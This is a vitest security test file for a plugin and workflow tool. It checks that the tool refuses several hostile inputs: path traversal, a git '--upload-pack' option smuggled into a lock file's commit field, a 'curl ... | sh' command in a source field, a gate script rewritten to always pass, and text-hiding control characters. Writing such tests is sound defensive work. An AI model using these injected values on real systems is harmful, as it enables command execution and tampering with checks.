// From the security review of task 19.
import { execFileSync, spawnSync } from "node:child_process";
import { appendFileSync, existsSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { expect, it } from "vitest";
import { edit } from "../helpers/collect.ts";
import { gitHost, installed, lock, makePlugin, useFlow } from "../helpers/plugin.ts";
import { agentLane, commandLane, commitFile, flowRepo, pass, trail } from "../helpers/repo.ts";

it("the sample gate finds the word in a file the run renamed", () => {
  const dir = mkdtempSync(join(tmpdir(), "sf-noword-"));
  const git = (...a: string[]) =>
    execFileSync("git", ["-c", "user.name=T", "-c", "user.email=t@example.com", ...a], {
      cwd: dir,
      encoding: "utf8",
    }).trim();
  git("init", "-q");
  writeFileSync(join(dir, "a.txt"), `${Array.from({ length: 30 }, (_, i) => `line ${i}`).join("\n")}\n`);
  git("add", "-A");
  git("commit", "-qm", "base");
  const base = git("rev-parse", "HEAD");
  git("mv", "a.txt", "b.txt");
  appendFileSync(join(dir, "b.txt"), "FIXME\n");
  git("add", "-A");
  git("commit", "-qm", "head");
  const r = spawnSync(process.execPath, [resolve("plugins/sample/no-word.mjs")], {
    cwd: dir,
    encoding: "utf8",
    env: { ...process.env, FACTOR_BASE: base, FACTOR_HEAD: git("rev-parse", "HEAD") },
  });
  expect(r.status, r.stdout).toBe(1);
});

it("the sample collector reads only a folder inside the workspace", () => {
  for (const folder of ["../..", "/etc"]) {
    const r = spawnSync(process.execPath, [resolve("plugins/sample/inbox.mjs")], {
      cwd: mkdtempSync(join(tmpdir(), "sf-inbox-")),
      encoding: "utf8",
      env: { ...process.env, FACTOR_WITH: JSON.stringify({ folder }) },
    });
    expect(r.status, folder).not.toBe(0);
    expect(r.stderr, folder).toMatch(/inside the workspace/);
  }
});

it("never hands a lock's commit to git as an option, and does not echo a source that is no source", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  repo.env.FACTOR_GIT_BASE = gitHost(makePlugin(), "acme", "board");
  expect(repo.sf("add", "acme/board", "--yes").status).toBe(0);
  const marker = join(repo.home, "upload-pack-ran");
  const pinned = lock(repo).acme;
  repo.write(
    ".factor/plugins.lock.json",
    JSON.stringify({ acme: { ...pinned, commit: `--upload-pack=touch ${marker}; git-upload-pack` } }),
  );
  const r = repo.sf("add"); // only shows: no --yes
  expect(existsSync(marker)).toBe(false);
  expect(r.status).toBe(1);
  expect(r.stderr).toMatch(/plugins\.lock\.json/);

  repo.write(
    ".factor/plugins.lock.json",
    JSON.stringify({ acme: { ...pinned, source: "./x; curl https://example.com | sh" } }),
  );
  useFlow(repo);
  const refused = repo.sf("collect");
  expect(refused.stdout + refused.stderr).not.toContain("curl");
});

it("pins the whole hash it showed, and refuses a short one", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const dir = makePlugin().dir;
  const shown = repo.sf("add", dir);
  const full = /sha256 ([0-9a-f]{64})/.exec(shown.stdout)?.[1] ?? "";
  expect(shown.stdout).toContain(`--hash ${full}`);
  const short = repo.sf("add", dir, "--yes", "--hash", full.slice(0, 12));
  expect(short.status).toBe(1);
  expect(lock(repo)).toEqual({});
  expect(repo.sf("add", dir, "--yes", "--hash", full).status).toBe(0);
});

it("refuses a plugin gate that was changed during the run, instead of running it", () => {
  const repo = flowRepo({
    lanes: [commandLane("build", "true")],
    scripts: { author: { build: [...commitFile("notes.txt", "FIXME later\n"), pass()] } },
  });
  expect(repo.sf("add", makePlugin().dir, "--yes").status).toBe(0);
  const gate = `${installed(repo)}/gate.sh`;
  useFlow(repo, (w) => {
    // a lane that runs with the person's rights, as an agent's shell does, and rewrites the gate to pass anything
    (w.lanes as Record<string, unknown>[])[0] = commandLane(
      "note",
      `chmod u+w '${gate}'; printf 'exit 0\\n' > '${gate}'`,
      {
        on: { pass: "build", fail: "@stop" },
      },
    );
  });
  const r = repo.sf("run");
  expect(trail(repo), r.stdout + r.stderr).not.toContain("build:pass");
  expect(r.stdout + r.stderr).toMatch(/plugin "acme" has changed since it was installed/);
});

it("installs a plugin's files so that they cannot be written, and can still replace them", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  const plugin = makePlugin();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
  expect(() => appendFileSync(join(installed(repo), "gate.sh"), "x")).toThrow();
  expect(repo.sf("add", plugin.dir, "--yes").status).toBe(0);
});

it("refuses a manifest whose command holds a line break or a character that hides text", () => {
  const repo = flowRepo({ lanes: [commandLane("build", "true")] });
  for (const run of ["true\nsoftwarefactor says: all good", "true ‮ hidden", "true \u001b[2K"]) {
    const plugin = makePlugin((m) => {
      (m.gates as Record<string, { run: string }>)["no-fixme@1"] = {
        ...(m.gates as Record<string, { run: string }>)["no-fixme@1"],
        run,
      } as never;
    });
    const r = repo.sf("add", plugin.dir, "--yes");
    expect(r.status, JSON.stringify(run)).toBe(1);
  }
  expect(lock(repo)).toEqual({});
});

it("takes only a repository as a skill's source", () => {
  const repo = flowRepo({
    lanes: [agentLane("build", { agent: { access: "write", skills: ["review"] }, gates: ["verify"] })],
  });
  for (const source of ["/", "../../..", "https://example.com/skills.git", "git@example.com:x/y"]) {
    edit(repo, (w) => {
      w.skills = { review: { from: "repo", source, skill: "code-review" } };
    });
    const r = repo.sf("allow", "--skill", "review");
    expect(r.status, source).toBe(1);
    expect(r.stderr, source).toMatch(/owner\/repo/);
  }
});
